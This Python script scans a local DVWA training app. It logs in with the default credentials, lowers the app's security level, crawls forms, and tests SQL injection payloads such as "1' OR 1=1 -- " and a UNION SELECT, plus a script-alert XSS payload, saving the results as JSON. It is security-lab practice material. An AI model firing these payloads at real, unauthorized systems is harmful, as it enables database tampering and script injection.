import requests
from bs4 import BeautifulSoup
import json

# ---------------------------------------
# CONFIG
# ---------------------------------------
BASE_URL = "http://localhost/dvwa"
LOGIN_URL = f"{BASE_URL}/login.php"
SECURITY_URL = f"{BASE_URL}/security.php"

SQLI_URL = f"{BASE_URL}/vulnerabilities/sqli/"
XSS_R_URL = f"{BASE_URL}/vulnerabilities/xss_r/"
XSS_S_URL = f"{BASE_URL}/vulnerabilities/xss_s/"

session = requests.Session()

# ---------------------------------------
# LOGIN FUNCTION
# ---------------------------------------
def login():
    print("\n[+] Logging into DVWA...")

    login_page = session.get(LOGIN_URL)
    soup = BeautifulSoup(login_page.text, "html.parser")
    user_token = soup.find("input", {"name": "user_token"})["value"]

    login_data = {
        "username": "admin",
        "password": "password",
        "Login": "Login",
        "user_token": user_token
    }

    session.post(LOGIN_URL, data=login_data)
    print("✅ Login Successful")


# ---------------------------------------
# SET SECURITY LOW
# ---------------------------------------
def set_security_low():
    print("[+] Setting Security Level to LOW...")

    security_page = session.get(SECURITY_URL)
    soup = BeautifulSoup(security_page.text, "html.parser")
    security_token = soup.find("input", {"name": "user_token"})["value"]

    security_data = {
        "security": "low",
        "seclev_submit": "Submit",
        "user_token": security_token
    }

    session.post(SECURITY_URL, data=security_data)
    print("✅ Security Level Set to LOW")


# ---------------------------------------
# CRAWLER FUNCTION
# ---------------------------------------
def crawl_forms(url):
    print(f"\n[+] Crawling Forms from: {url}")

    response = session.get(url)
    soup = BeautifulSoup(response.text, "html.parser")
    forms = soup.find_all("form")

    forms_list = []

    for form in forms:
        form_details = {
            "action": form.get("action"),
            "method": form.get("method", "get"),
            "inputs": [
                {
                    "type": inp.get("type"),
                    "name": inp.get("name")
                }
                for inp in form.find_all("input")
                if inp.get("name")
            ]
        }
        forms_list.append(form_details)

    return forms_list


# ---------------------------------------
# SQL INJECTION TEST
# ---------------------------------------
def test_sqli():
    print("\n============================")
    print("        SQLI TESTING")
    print("============================")

    payloads = [
        "1' OR 1=1 -- ",
        "' OR '1'='1",
        "1' OR 'a'='a",
        "' UNION SELECT NULL,NULL -- "
    ]

    normal_response = session.get(SQLI_URL, params={"id": "1", "Submit": "Submit"})
    normal_length = len(normal_response.text)

    results = []

    for payload in payloads:
        response = session.get(SQLI_URL, params={"id": payload, "Submit": "Submit"})
        injected_length = len(response.text)

        if injected_length != normal_length:

            print(f"\nURL: {SQLI_URL}")
            print(f"   Payload: {payload}")
            print(f"   Response Code: {response.status_code}")
            print(f"   Response Length: {injected_length}")

            results.append({
                "url": SQLI_URL,
                "payload": payload,
                "response_code": response.status_code,
                "response_length": injected_length
            })

    if results:
        with open("sqli_report.json", "w") as f:
            json.dump(results, f, indent=4)
        print("\n✅ SQLI Report Saved")

    return results


# ---------------------------------------
# XSS TEST
# ---------------------------------------
def test_xss():
    print("\n============================")
    print("        XSS TESTING")
    print("============================")

    payload = "<script>alert('XSS')</script>"
    target_urls = [XSS_R_URL, XSS_S_URL]

    results = []

    for url in target_urls:
        response = session.get(url, params={"name": payload, "Submit": "Submit"})
        response_length = len(response.text)

        if payload in response.text:

            print(f"\nURL: {url}")
            print(f"   Payload: {payload}")
            print(f"   Response Code: {response.status_code}")
            print(f"   Response Length: {response_length}")

            results.append({
                "url": url,
                "payload": payload,
                "response_code": response.status_code,
                "response_length": response_length
            })

    if results:
        with open("xss_report.json", "w") as f:
            json.dump(results, f, indent=4)
        print("\n✅ XSS Report Saved")

    return results


# ---------------------------------------
# MAIN EXECUTION
# ---------------------------------------
def main():

    login()
    set_security_low()

    print("\n============================")
    print("        CRAWLING")
    print("============================")

    urls = [LOGIN_URL, SQLI_URL, XSS_R_URL, XSS_S_URL]
    scan_data = {}

    for url in urls:
        forms = crawl_forms(url)
        scan_data[url] = forms

    with open("scan_results.json", "w") as f:
        json.dump(scan_data, f, indent=4)

    print("✅ Crawling Completed")

    # Run SQLI
    sqli_results = test_sqli()

    # Run XSS
    xss_results = test_xss()

    print("\n============================")
    print("        FINAL SUMMARY")
    print("============================")

    print("Total SQLI Vulnerabilities:", len(sqli_results))
    print("Total XSS Vulnerabilities:", len(xss_results))
    print("All Reports Saved Successfully ✅")


if __name__ == "__main__":
    main()